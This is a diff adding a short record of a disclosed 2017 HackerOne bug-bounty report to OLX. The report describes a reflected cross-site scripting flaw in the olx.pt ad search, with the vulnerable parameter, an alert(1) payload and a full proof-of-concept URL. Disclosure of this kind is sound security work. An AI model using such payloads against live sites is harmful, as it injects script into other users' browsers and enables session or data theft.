@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/206125
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ph0b0s
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:06.04.2017 13:44:42
+
+Summary:
+
+Vulnerable link
+
+https://www.olx.pt/ads/q-klnjkoh/?search[description]=
+
+Payload
+
+'%2balert(1)%2b'
+
+and finally here a p0c
+
+https://www.olx.pt/ads/q-klnjko/?search[description]='%2balert(1)%2b'search[private_business]=private
+
+Work in latest version of firefox and chrome
+
+Cheers
+Ph0b0s
